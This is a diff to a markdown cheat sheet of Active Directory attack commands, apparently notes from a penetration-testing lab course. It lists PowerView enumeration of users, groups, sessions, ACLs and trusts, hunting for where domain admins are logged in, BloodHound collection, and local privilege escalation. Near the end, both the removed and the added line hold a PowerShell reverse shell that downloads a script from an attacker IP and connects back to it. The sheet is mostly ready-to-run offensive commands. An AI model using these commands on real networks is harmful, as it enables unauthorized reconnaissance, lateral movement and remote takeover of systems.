@@ -37,7 +37,7 @@ ls \\computername\c$
 ## Powerview Domain
 https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
 ```
-. C:\ad\tools\PowerView.ps1
+. ./PowerView.ps1
 ```
 
 #### Get current domain
@@ -62,16 +62,31 @@ Get-DomainPolicy
 ```
 
 ## Powerview users groups and computers
-#### Information of domain controller
+#### Get Information of domain controller
 ```
 Get-NetDomainController
 ```
 
-#### Get information of users in the domain // list of users
+#### Get information of users in the domain
 ```
 Get-NetUser
 Get-NetUser -Username student244
+```
+
+#### Get list of all users
+```
 Get-NetUser | select samaccountname
+```
+
+#### Get list of usernames, last logon and password last set
+```
+Get-NetUser | select samaccountname, lastlogon, pwdlastset
+Get-NetUser | select samaccountname, lastlogon, pwdlastset | Sort-Object -Property lastlogon
+```
+
+#### Get list of usernames and their groups
+```
+Get-NetUser | select samaccountname, memberof
 ```
 
 #### Get list of all properties for users in the current domain
@@ -87,9 +102,18 @@ Find-UserField -SearchField Description -SearchTerm "built"
 #### Get computer information
 ```
 Get-NetComputer
-Get-NetComputer -OperatingSystem "*Server 2016*"
 Get-NetComputer -FullData
-Get-NetComputer -fulldata | select samaccountname,operatingsystem
+Get-NetComputer -Computername dcorp-std244.dollarcorp.moneycorp.local -FullData
+```
+
+#### Get computers with operating system ""
+```
+Get-NetComputer -OperatingSystem "*Server 2016*"
+```
+
+#### Get list of all computer names and operating systems
+```
+Get-NetComputer -fulldata | select samaccountname, operatingsystem, operatingsystemversion
 ```
 
 #### List all groups of the domain
@@ -101,8 +125,8 @@ Get-NetGroup -Domain moneycorp.local
 
 #### Get all the members of the group
 ```
-Get-NetGroupMember -Groupname "group" -Recurse
 Get-NetGroupMember -Groupname "Domain Admins" -Recurse
+Get-NetGroupMember -Groupname "Domain Admins" -Recurse | select MemberName
 ```
 
 #### Get the group membership of a user
@@ -125,9 +149,9 @@ Get-NetlocalGroup -Computername dcorp-dc.dollarcorp.moneycorp.local -Recurse
 Get-NetLoggedon -Computername <servername>
 ```
 
-#### Get locally logged users on a computer (needs remote registary rights on the target)
+#### Get locally logged users on a computer (needs remote registry rights on the target)
 ```
-Get-LoggedonLocal -Computername dcorp-dc.dollarcorp.moneycorp.local
+Get-LoggedonLocal -Computername <servername>
 ```
 
 #### Get the last logged users on a computer (needs admin rights and remote registary on the target)
@@ -179,14 +203,16 @@ Find-GPOLocation -Username student244 -Verbose
 Get-NetOU -Fulldata
 ```
 
-#### Get machines t hat are part of an OU
+#### Get machines that are part of an OU
 ```
 Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
 ```
 
 #### Get GPO applied on an OU
 ```
-Get-NetGPO -GPOname "{Guid}"
+Get-NetGPO -GPOname "{<gplink>}"
+
+#gplink from Get-NetOU -Fulldata
 ```
 
 ## Powerview ACL
@@ -221,12 +247,12 @@ Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "student244"}
 Get-NetDomainTrust
 ```
 
-#### Get details about the current forest
+#### Get details about the forest
 ```
 Get-NetForest
 ```
 
-#### Get all domains in the current forest
+#### Get all domains in the forest
 ```
 Get-NetForestDomain
 Get-NetforestDomain -Forest eurocorp.local
@@ -249,45 +275,71 @@ Get-NetForestDomain -Verbose | Get-NetDomainTrust
 ####  Powerview Find all machines on the current domain where the current user has local admin access
 ```
 Find-LocalAdminAccess -Verbose
+```
 
+```
 . ./Find-WMILocalAdminAccess.ps1
 Find-WMILocalAdminAccess
+```
+
+```
+. ./Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess
 ```
 
 ####  Powerview Find local admins on all machines of the domain (needs admin privs)
 ```
 Invoke-EnumerateLocalAdmin -Verbose
-
-. ./Find-PSRemotingLocalAdminAccess.ps1
-Find-PSRemotingLocalAdminAccess
 ```
 
 #### Connect to machine with administrator privs
 ```
 Enter-PSSession -Computername <computername>
+```
+
+#### Save and use sessions of a machine
+```
 $sess = New-PSSession -Computername <computername>
 Enter-PSSession $sess
 ```
 
-####  Find computers where a domain admin has sessions
+####  Find active sessions
 ```
+Invoke-UserHunter
 Invoke-UserHunter -Groupname "RDPUsers"
+```
+
+####  Find active sessions of domain admins
+```
+Invoke-UserHunter -Groupname "Domain Admins"
+```
+
+####  Fheck access to machine
+```
 Invoke-UserHunter -CheckAccess
 ```
 
 ####  BloodHound
+https://github.com/BloodHoundAD/BloodHound
 ```
+cd Ingestors
 . ./sharphound.ps1
 Invoke-Bloodhound -CollectionMethod all -Verbose
 Invoke-Bloodhound -CollectionMethod LoggedOn -Verbose
-Run neo4j.bat
-#Install and start the service
+
+#Copy neo4j-community-3.5.1 to C:\
+#Open cmd
+cd C:\neo4j\neo4j-community-3.5.1-windows\bin
+neo4j.bat install-service
+neo4j.bat start
+#Browse to BloodHound-win32-x64
 Run BloodHound.exe
+#Change credentials and login
 ```
 
 ####  Powershell reverse shell
 ```
-Powershell.exe iex (iwr http://172.16.100.244/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.244 -Port 443
+Powershell.exe iex (iwr http://172.16.100.244/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress 172.16.100.244 -Port 4000
 ```
 
 # Local privilege escalation
@@ -295,7 +347,7 @@ Focussing on Service issues
 #### Privesc check all
 https://github.com/enjoiz/Privesc
 ```
-. ./Invoke-PrivEsc
+. .\privesc.ps1
 Invoke-PrivEsc
 ```
 
